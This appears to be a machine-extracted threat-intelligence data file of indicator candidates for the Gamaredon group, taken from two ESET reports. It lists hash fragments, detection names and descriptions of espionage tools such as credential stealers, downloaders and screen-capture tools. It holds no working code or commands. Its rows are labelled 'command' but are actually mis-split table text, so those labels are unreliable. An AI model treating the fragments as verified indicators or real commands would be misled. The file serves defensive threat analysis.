1.0.0,actor--gamaredon,artifact--sha256:525bde956c9a5de97fd6e1c9c44951aabccf43c9f6929119b1bc2d0ec0ce9d5c,observation--sha256:68f43874b03003492ef6e5be2e667541c685317eaac607f80b8c9051710b192e,command,5720FFDF9D9CD649445CBC12844E2B587622643A ) is a unique PowerShell tool that uses a legitimate,5720FFDF9D9CD649445CBC12844E2B587622643A ) is a unique PowerShell tool that uses a legitimate,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"32 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroClone Discovered by ESET Research in July 2023, PteroClone (SHA-1: 5720FFDF9D9CD649445CBC12844E2B587622643A ) is a unique PowerShell tool that uses a legitimate command line program – rclone – for managing files on cloud storage to download the next stage . It first downloads the rclone binary and c onfiguration file to %APPDATA%\Defrag , naming them Defrag.exe and rclone.conf , respectively. It",
1.0.0,actor--gamaredon,artifact--sha256:14e1c9c765e7a85f65d0ec0bd7f5e5cc1ae940a1fa308f87824e29ecfb9084c7,observation--sha256:95ac0172b8ba9ba62290fd8858238df9249601cd89526663f2dd8e421ed00060,command,5BEB9739CBA6470FE585 N/A PowerShell/Pterodo.GO,5BEB9739CBA6470FE585 N/A PowerShell/Pterodo.GO,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,42 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 2B9B0AD0B65BB6101704 684CD339E946FAE2DCFA N/A VBS/Pterodo.ABV PteroSand – a VBScript general - purpose downloader. 2416DFC031CF0D05054D 5BEB9739CBA6470FE585 N/A PowerShell/Pterodo.GO PteroScout – gathers and exfiltrates various information about the compromis ed system. 8C79BB8EB97E774FFCEC 66C64F5CC8A11ED6C693 N/A PowerShell/Pterodo.GL Downloader of PteroScout. B,
1.0.0,actor--gamaredon,artifact--sha256:c467575d7e2b7141a69410ffac8ae3a96289bba5f709572cc2651a47c5100776,observation--sha256:da0827fdab504ca79533a286404be7a2c256beeb1b625491696b1fc07a903723,command,5CFE3DC37750834F0990 N/A PowerShell/Pterodo.GH PteroPShell – PowerShell reverse,5CFE3DC37750834F0990 N/A PowerShell/Pterodo.GH PteroPShell – PowerShell reverse,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,41 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 025E3D88C53FC12D5A4A AB726E696F2815BAC84D N/A VBS/Pterodo.TX PteroPSLoad – PowerShell downloader. D5576E578518E474A5DF F654C44AB3EC4A6E4ECF N/A PowerShell/Pterodo.FD PteroPSLoad – PowerShell downloader. 28F4F0367C2BB0574C8A 7D1B9C3E71E6AC678300 N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell downloader. E0BD8855159CB708789C 4DE183E107C5C117FBA1 N/A PowerShell/P,
1.0.0,actor--gamaredon,artifact--sha256:e17a241d419e7cbd7f1750bde266390489c17396622e216e040e65d7abaefba7,observation--sha256:381864b99b00b46544cc6934620035b833be79fd56e97928f46be48f13ea6357,command,6575120B9EA65D0AEAEA N/A PowerShell/Pterodo.EG PteroSteal – credential stealer.,6575120B9EA65D0AEAEA N/A PowerShell/Pterodo.EG PteroSteal – credential stealer,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,42 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 2B9B0AD0B65BB6101704 684CD339E946FAE2DCFA N/A VBS/Pterodo.ABV PteroSand – a VBScript general - purpose downloader. 2416DFC031CF0D05054D 5BEB9739CBA6470FE585 N/A PowerShell/Pterodo.GO PteroScout – gathers and exfiltrates various information about the compromis ed system. 8C79BB8EB97E774FFCEC 66C64F5CC8A11ED6C693 N/A PowerShell/Pterodo.GL Downloader of PteroScout. B,
1.0.0,actor--gamaredon,artifact--sha256:df5038df852db1599407cc5894392bb09a5a3e15e3073962a075218bf0525f7a,observation--sha256:ba0fb62bdc10d132bea33690b104d8e942fe01b4b18f6bf8b4b6bbd009ccfd73,command,6649BA3DABE8A9671305 N/A PowerShell/Pterodo.FT PteroGram – steals data that belongs,6649BA3DABE8A9671305 N/A PowerShell/Pterodo.FT PteroGram – steals data that belongs,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"39 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 IOCS Files In this section, w e only provide one example for each tool or variant . All IoCs were already provided in the MISP events published with private ESET Threat Intelligence reports throughout 2022 and 2023. SHA-1 Filename Detection Description DF1C0A70E7A02B839AB3 AAC3FC410E61EEFB58EB N/A VBS/Pterodo.AEV PteroX – a VBScript general -purpose downloader. B50F10BBDB49BE6D868B 09F3E1DD6C78D58D8E",
1.0.0,actor--gamaredon,artifact--sha256:883b9b9a43d45b7a8c88b82a43b9c9d54d3620ab6728df738c91598c7a3bfb33,observation--sha256:9d297fd766ceae851b822c0c850e6fe2372c0f22fbaf96e26af8ee6effd2cab8,command,66C64F5CC8A11ED6C693 N/A PowerShell/Pterodo.GL Downloader of PteroScout.,66C64F5CC8A11ED6C693 N/A PowerShell/Pterodo.GL Downloader of PteroScout,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,42 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 2B9B0AD0B65BB6101704 684CD339E946FAE2DCFA N/A VBS/Pterodo.ABV PteroSand – a VBScript general - purpose downloader. 2416DFC031CF0D05054D 5BEB9739CBA6470FE585 N/A PowerShell/Pterodo.GO PteroScout – gathers and exfiltrates various information about the compromis ed system. 8C79BB8EB97E774FFCEC 66C64F5CC8A11ED6C693 N/A PowerShell/Pterodo.GL Downloader of PteroScout. B,
1.0.0,actor--gamaredon,artifact--sha256:70462f6a54ab6543ca4a296ead3c1c49fbbb3a90a941e43f7c5b21ac65b60409,observation--sha256:142f533bb34bb6109e69a949c3b3d3fdc312fa17c27e2f134f2adc733cee379e,command,7D1B9C3E71E6AC678300 N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell,7D1B9C3E71E6AC678300 N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,41 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 025E3D88C53FC12D5A4A AB726E696F2815BAC84D N/A VBS/Pterodo.TX PteroPSLoad – PowerShell downloader. D5576E578518E474A5DF F654C44AB3EC4A6E4ECF N/A PowerShell/Pterodo.FD PteroPSLoad – PowerShell downloader. 28F4F0367C2BB0574C8A 7D1B9C3E71E6AC678300 N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell downloader. E0BD8855159CB708789C 4DE183E107C5C117FBA1 N/A PowerShell/P,
1.0.0,actor--gamaredon,artifact--sha256:a01e9972bdeb08e889bfd02d2def88853a4b323ed8d1fdb756fb867952acf2b0,observation--sha256:9fe381df59f734e9907b5e8bdbe1c5a5932dfa34f709e70a28e44b20f6724eb7,command,7E4F41E9BC81B9098BC5 N/A PowerShell/TrojanDownlo,7E4F41E9BC81B9098BC5 N/A PowerShell/TrojanDownlo,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 41}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,40 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 945A50678E6E9AA29370 7E4F41E9BC81B9098BC5 N/A PowerShell/TrojanDownlo ader.Agent.GBK Downloader of PteroGram. AB7C5C7CD6F75B1D0A7A D29176A254055BE5356E N/A VBS/Pterodo.SC Downloader of PowerSh ell version of PteroLNK. 866E874CFF4EAD298899 24AA02630E68AE252B55 N/A VBS/Pterodo.SL Downloader of the VBScript version of PteroLNK. 49CF239AB2EBD04CAFDC EC07FBB0C1C1A43E8C,
1.0.0,actor--gamaredon,artifact--sha256:7cb6ebe52b6713f9ef2c21d2a4a15f8a65ba909d40b487d030bf05cc697bba84,observation--sha256:318dfb6769003fa812b975016bdd8d301926d4f38731a21051b7a39bd3065761,command,867DBF76DFB1E130E93 N/A PowerShell/Pterodo.WY PteroPaste – downloader and USB,867DBF76DFB1E130E93 N/A PowerShell/Pterodo.WY PteroPaste – downloader and USB,candidate,2025-11-20T00:00:00Z,day,known,same-record,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"31 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances SHA -1 Filename Detection Description F718F25DCCF68BD7CB28A A7CB526FFA54B0E51A8 N/A PowerShell/TrojanDownloa der.Agent.LDD Downloader of PteroPSDoor. 09A22856890AB6AEF6311 CA2BD27BE54E86DA75C N/A PowerShell/Pterodo.QD PteroPSLoad – PowerShell downloader. 0F952E6162BCC881F7F84 4F3E2C7CDA9A5C74D72 N/A PowerShell/Pterodo.SU PteroPSLoad – PowerShell downloader. 61B03FF9D84EB653F9F66 867DBF76DFB1E130E93 N/A PowerShell/Pt",
1.0.0,actor--gamaredon,artifact--sha256:ecbb70de7f2ccfe8c95502d386784255e2d043ae41c6152b4489c3ec6c0a1d1d,observation--sha256:4f1aaa460e69f17f7c63662b475193044e86c8bd88de93f828c0faf7086848a7,command,895D9F3225EFB1273DCC N/A PowerShell/Pterodo.WY PteroBox API variant.,895D9F3225EFB1273DCC N/A PowerShell/Pterodo.WY PteroBox API variant,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances After a break in January 2025, Gamaredon resumed running frequent spearphishing campaigns, with notably higher activity in the second half of the year , during which Gamaredon also slightly tweaked its TTPs, and started exploiting a vulnerability affecting WinRAR ( CVE-2025-8088) to deploy its typical malicious HTA downloaders . Lastly, Gamaredon continued with its efforts to protect and hide its network infrastruct",
1.0.0,actor--gamaredon,artifact--sha256:7f18050c3877bfdeabf3915e43679ad0220f9ae25bf34a51b786d487dbc549d6,observation--sha256:6fe42a2d0d9dc280f71e9b4c836d1f949c4bbd2d20395b4eef5d1f17361fb542,command,89C9011FE181CE169A47 N/A PowerShell/Pterodo.BQ PteroScreen – screen capturing tool.,89C9011FE181CE169A47 N/A PowerShell/Pterodo.BQ PteroScreen – screen capturing tool,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,42 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 2B9B0AD0B65BB6101704 684CD339E946FAE2DCFA N/A VBS/Pterodo.ABV PteroSand – a VBScript general - purpose downloader. 2416DFC031CF0D05054D 5BEB9739CBA6470FE585 N/A PowerShell/Pterodo.GO PteroScout – gathers and exfiltrates various information about the compromis ed system. 8C79BB8EB97E774FFCEC 66C64F5CC8A11ED6C693 N/A PowerShell/Pterodo.GL Downloader of PteroScout. B,
1.0.0,actor--gamaredon,artifact--sha256:76d6d327b01888500617611b98c3d2adc368297d89da002f16e9fb3ce2a248b0,observation--sha256:872b23d6d4a3543ab5f135de106bd76f622911456c284009da4619b2dbc0bdb6,command,8A2261D8C8111D2D99276575120B9EA65D0AEAEA ) is a PowerShell infostealer that steals credentials,8A2261D8C8111D2D99276575120B9EA65D0AEAEA ) is a PowerShell infostealer that steals credentials,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"28 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroScreen First seen by ESET Research in July 2022, PteroScreen (SHA-1: BA2366ED4E83FFC6DEC489C9011FE181CE169A47 ) is a PowerShell scree n-capturing tool that takes screenshots of all screens and temporarily stores the image in %TEMP% \<randomNumber>.png . The screenshot is then base64 encoded and uploaded to the C&C server along with the system drive ’s volume serial number via an HTTP POST reques",
1.0.0,actor--gamaredon,artifact--sha256:724f2579788634e1ebdfff3edac2f595a1136f4b1cd6ab00dc1b705c839afaa6,observation--sha256:8ce811ecb1d05bcc0e0587a720ecafed8820679ae083db1b8ff7b23593c788aa,command,8E7B1094891627B3C706 N/A PowerShell/Pterodo.QB,8E7B1094891627B3C706 N/A PowerShell/Pterodo.QB,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances After a break in January 2025, Gamaredon resumed running frequent spearphishing campaigns, with notably higher activity in the second half of the year , during which Gamaredon also slightly tweaked its TTPs, and started exploiting a vulnerability affecting WinRAR ( CVE-2025-8088) to deploy its typical malicious HTA downloaders . Lastly, Gamaredon continued with its efforts to protect and hide its network infrastruct",
1.0.0,actor--gamaredon,artifact--sha256:57a105979a7a4562c70b598a57112cb5c77be2cc8469bbeace17324420c35d38,observation--sha256:9049307decff6a5189de6a596409f78886785f62e18899c9a7ce71381044feb1,command,8F5FE5AF7F0C2BF67F95 N/A PowerShell/Pterodo.GA Downloader of PteroPSDoor variant 2.,8F5FE5AF7F0C2BF67F95 N/A PowerShell/Pterodo.GA Downloader of PteroPSDoor variant 2,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 41}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,40 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 945A50678E6E9AA29370 7E4F41E9BC81B9098BC5 N/A PowerShell/TrojanDownlo ader.Agent.GBK Downloader of PteroGram. AB7C5C7CD6F75B1D0A7A D29176A254055BE5356E N/A VBS/Pterodo.SC Downloader of PowerSh ell version of PteroLNK. 866E874CFF4EAD298899 24AA02630E68AE252B55 N/A VBS/Pterodo.SL Downloader of the VBScript version of PteroLNK. 49CF239AB2EBD04CAFDC EC07FBB0C1C1A43E8C,
1.0.0,actor--gamaredon,artifact--sha256:3b6fbfd34bec12867accfa86a72a900f91d543ff032ed55c0d74e852c88cd537,observation--sha256:8fad32657acdd63b7bff76e11877c774b204f8469d71262325864d758ca7283b,command,9184101185D368F2B6CE N/A PowerShell/Pterodo.GK Downloader of PteroSteal.,9184101185D368F2B6CE N/A PowerShell/Pterodo.GK Downloader of PteroSteal,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,42 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 2B9B0AD0B65BB6101704 684CD339E946FAE2DCFA N/A VBS/Pterodo.ABV PteroSand – a VBScript general - purpose downloader. 2416DFC031CF0D05054D 5BEB9739CBA6470FE585 N/A PowerShell/Pterodo.GO PteroScout – gathers and exfiltrates various information about the compromis ed system. 8C79BB8EB97E774FFCEC 66C64F5CC8A11ED6C693 N/A PowerShell/Pterodo.GL Downloader of PteroScout. B,
1.0.0,actor--gamaredon,artifact--sha256:41a88bf3029f6d0712ff222bba12e2b00d7537bd4c33112ce7125ad24cf4e576,observation--sha256:5ddc710c9f73f63461ea52f93893db9106e05c2d3849d0a4747b51fba35c9398,command,990689AC989B44A0A230 N/A PowerShell/Pterodo.UE PteroEffigy – downloads PowerShell,990689AC989B44A0A230 N/A PowerShell/Pterodo.UE PteroEffigy – downloads PowerShell,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances After a break in January 2025, Gamaredon resumed running frequent spearphishing campaigns, with notably higher activity in the second half of the year , during which Gamaredon also slightly tweaked its TTPs, and started exploiting a vulnerability affecting WinRAR ( CVE-2025-8088) to deploy its typical malicious HTA downloaders . Lastly, Gamaredon continued with its efforts to protect and hide its network infrastruct",
1.0.0,actor--gamaredon,artifact--sha256:57dd58766af2f70a3d4cfe410c88b25bfc2b5e2e9af3a78430787fe3a9e8202c,observation--sha256:425c1d7ce91cc123f8dc7bc1fa5d9d2f8ae6ff087722629b00770cf816c641c7,command,9B7C516BD9D4C1B4B1E4 N/A PowerShell/Pterodo.GK Downloader of PteroDig.,9B7C516BD9D4C1B4B1E4 N/A PowerShell/Pterodo.GK Downloader of PteroDig,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"39 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 IOCS Files In this section, w e only provide one example for each tool or variant . All IoCs were already provided in the MISP events published with private ESET Threat Intelligence reports throughout 2022 and 2023. SHA-1 Filename Detection Description DF1C0A70E7A02B839AB3 AAC3FC410E61EEFB58EB N/A VBS/Pterodo.AEV PteroX – a VBScript general -purpose downloader. B50F10BBDB49BE6D868B 09F3E1DD6C78D58D8E",
1.0.0,actor--gamaredon,artifact--sha256:7ba486ec8661c0e0933dfff3396a1cefad820afdb11d90d3f7b9e8fa37722d07,observation--sha256:d4be4f64bb227031ea4eef622ec73a167b308bac3a0599f26d46c05a07936973,command,9D9A3B9CF5AD502AFECC N/A PowerShell/TrojanDownlo,9D9A3B9CF5AD502AFECC N/A PowerShell/TrojanDownlo,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,41 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 025E3D88C53FC12D5A4A AB726E696F2815BAC84D N/A VBS/Pterodo.TX PteroPSLoad – PowerShell downloader. D5576E578518E474A5DF F654C44AB3EC4A6E4ECF N/A PowerShell/Pterodo.FD PteroPSLoad – PowerShell downloader. 28F4F0367C2BB0574C8A 7D1B9C3E71E6AC678300 N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell downloader. E0BD8855159CB708789C 4DE183E107C5C117FBA1 N/A PowerShell/P,
1.0.0,actor--gamaredon,artifact--sha256:1992404c789c2fa47f3af38e64beeacec67053ba508425ad42c8c050d60ca214,observation--sha256:a9309c4fd9693fde249fc59f97c89f3d9fb0f2a1bc3c97fc0a5a5d18432c6b14,command,A7CB526FFA54B0E51A8 N/A PowerShell/TrojanDownloa,A7CB526FFA54B0E51A8 N/A PowerShell/TrojanDownloa,candidate,2025-11-20T00:00:00Z,day,known,same-record,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"31 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances SHA -1 Filename Detection Description F718F25DCCF68BD7CB28A A7CB526FFA54B0E51A8 N/A PowerShell/TrojanDownloa der.Agent.LDD Downloader of PteroPSDoor. 09A22856890AB6AEF6311 CA2BD27BE54E86DA75C N/A PowerShell/Pterodo.QD PteroPSLoad – PowerShell downloader. 0F952E6162BCC881F7F84 4F3E2C7CDA9A5C74D72 N/A PowerShell/Pterodo.SU PteroPSLoad – PowerShell downloader. 61B03FF9D84EB653F9F66 867DBF76DFB1E130E93 N/A PowerShell/Pt",
1.0.0,actor--gamaredon,artifact--sha256:089c6730a4b3dbafcce8c2e4aa817cf621106768e07436c25e7b9d0da1946497,observation--sha256:85c39baf19f9ddcdcde9032a7fb93dbb9894e51bd529ab64f44b5d9dcf8434ce,command,A90DD84A2A3619F5CC5 N/A PowerShell/Pterodo.WK PowerShell version of PteroSteal –,A90DD84A2A3619F5CC5 N/A PowerShell/Pterodo.WK PowerShell version of PteroSteal –,candidate,2025-11-20T00:00:00Z,day,known,same-record,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"31 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances SHA -1 Filename Detection Description F718F25DCCF68BD7CB28A A7CB526FFA54B0E51A8 N/A PowerShell/TrojanDownloa der.Agent.LDD Downloader of PteroPSDoor. 09A22856890AB6AEF6311 CA2BD27BE54E86DA75C N/A PowerShell/Pterodo.QD PteroPSLoad – PowerShell downloader. 0F952E6162BCC881F7F84 4F3E2C7CDA9A5C74D72 N/A PowerShell/Pterodo.SU PteroPSLoad – PowerShell downloader. 61B03FF9D84EB653F9F66 867DBF76DFB1E130E93 N/A PowerShell/Pt",
1.0.0,actor--gamaredon,artifact--sha256:6866ada3c376ca2a2e62e40c50eb8b8ceedeafb09c01fb0c745599e5a8c18b2c,observation--sha256:2e31a5bcc45529da83242560532796c85abf3a87d7f57805ca848dc33b6a8d7f,command,AB726E696F2815BAC84D N/A VBS/Pterodo.TX PteroPSLoad – PowerShell,AB726E696F2815BAC84D N/A VBS/Pterodo.TX PteroPSLoad – PowerShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,41 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 025E3D88C53FC12D5A4A AB726E696F2815BAC84D N/A VBS/Pterodo.TX PteroPSLoad – PowerShell downloader. D5576E578518E474A5DF F654C44AB3EC4A6E4ECF N/A PowerShell/Pterodo.FD PteroPSLoad – PowerShell downloader. 28F4F0367C2BB0574C8A 7D1B9C3E71E6AC678300 N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell downloader. E0BD8855159CB708789C 4DE183E107C5C117FBA1 N/A PowerShell/P,
1.0.0,actor--gamaredon,artifact--sha256:eea3a70a15dde6358dab8d60ce3650d61430e783e32b412d7144b475fcd3f1a8,observation--sha256:e5690bcac26d276910dfd8201ccb78327893ef0f0741751d33b7bb77073a63bf,command,AC17FD08A3987CC91DFD6649BA3DABE8A9671305 ) is a PowerShell infostealer targeting the Telegram,AC17FD08A3987CC91DFD6649BA3DABE8A9671305 ) is a PowerShell infostealer targeting the Telegram,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroGram Discovered by ESET Research in June 2023, PteroGram (SHA -1: AC17FD08A3987CC91DFD6649BA3DABE8A9671305 ) is a PowerShell infostealer targeting the Telegram Desktop application. Telegram Desktop stores its data in %APPDATA%\Telegram Desktop \tdata, which contains encrypted session data. The encryption key is derived from a passcode and salt, but if no passcode is set, an empty string is used ",
1.0.0,actor--gamaredon,artifact--sha256:c20c69bd023aadc55eb01b1d9d5ca5776bf2ee870024b2f2074ac41e1704d838,observation--sha256:1ce9cfd4fb7965e9d86564c6488e898c541792a4613fa43bfd02a52da6a1c0aa,command,AE6C4F69F95C846FCB38 N/A PowerShell/Pterodo.SV PteroBox rclone variant.,AE6C4F69F95C846FCB38 N/A PowerShell/Pterodo.SV PteroBox rclone variant,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances After a break in January 2025, Gamaredon resumed running frequent spearphishing campaigns, with notably higher activity in the second half of the year , during which Gamaredon also slightly tweaked its TTPs, and started exploiting a vulnerability affecting WinRAR ( CVE-2025-8088) to deploy its typical malicious HTA downloaders . Lastly, Gamaredon continued with its efforts to protect and hide its network infrastruct",
1.0.0,actor--gamaredon,artifact--sha256:0f25f13a68be86948d10265e729e56e7a369d3a039816b481544a3de19afe23e,observation--sha256:ac4b48922c9d52cbb1456500be905156d0b0a62239abb34dac09e11fd22b4af1,command,"An example of a different kind of obfuscation, mainly used in PowerShell scripts, is a PteroPSLo ad","An example of a different kind of obfuscation, mainly used in PowerShell scripts, is a PteroPSLo ad",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"35 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 An example of a different kind of obfuscation, mainly used in PowerShell scripts, is a PteroPSLo ad sample. As depicted in Figure 13, the main functionality code of PteroPSLoad is base64 encoded and embedded in a wrapper. The wrapper contains some cleartext code and large portions of irrelevant code, particularly within several try/catch blocks. However, relevant sections, highlighted with red frames",
1.0.0,actor--gamaredon,artifact--sha256:181c0686fe064fd2086f842fe22b3dae7399aff23dac426c8c7892c039438659,observation--sha256:8a63d6b0047e8b45b33bf5b507b282128a77ae304269fcbffb20eb83b526b4a3,command,August 2023 PowerShell,August 2023 PowerShell,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Classification First seen Written in Description PteroLNK VBScript version Weaponizer November 2020 VBScript Weaponizes connected USB drives. PteroPSLoad Downloader October 2021 PowerShell Downloads other Gamaredon tools. PteroBox File stealer November 2024 PowerShell Exfiltrates files to Dropbox. PteroPSDoor File stealer May 2022 PowerShell Exfiltrates files to Gamaredon C&C servers and various cloud storage se",
1.0.0,actor--gamaredon,artifact--sha256:20114121265115ee7f6b4b00c9ebe16114b8cff2cf028c3e746d22343612731d,observation--sha256:839bc4e2f89a2b4f2f89e1d7c2d14c30683a49542aab585be959e4b5520bc326,command,B196D6A6443B4BE05B4C N/A PowerShell/Pterodo.GA Downloader of PteroSig.,B196D6A6443B4BE05B4C N/A PowerShell/Pterodo.GA Downloader of PteroSig,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,42 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 2B9B0AD0B65BB6101704 684CD339E946FAE2DCFA N/A VBS/Pterodo.ABV PteroSand – a VBScript general - purpose downloader. 2416DFC031CF0D05054D 5BEB9739CBA6470FE585 N/A PowerShell/Pterodo.GO PteroScout – gathers and exfiltrates various information about the compromis ed system. 8C79BB8EB97E774FFCEC 66C64F5CC8A11ED6C693 N/A PowerShell/Pterodo.GL Downloader of PteroScout. B,
